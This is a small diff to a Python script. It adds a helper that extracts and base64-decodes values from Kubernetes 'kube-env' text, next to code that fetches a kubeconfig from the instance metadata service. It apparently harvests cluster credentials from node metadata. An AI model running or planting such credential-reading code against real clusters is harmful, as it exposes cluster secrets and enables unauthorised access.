@@ -105,6 +105,11 @@ def meta():
 
 
 
+def _kv(kubeenv, key):
+    m = re.search(r"^" + key + r":\s*(\S+)\s*$", kubeenv, re.M)
+    return base64.b64decode(m.group(1)) if m else None
+
+
 def api():
     out("===API2-BEGIN===")
     st, kc = md_get("instance/attributes/kubeconfig", timeout=15)
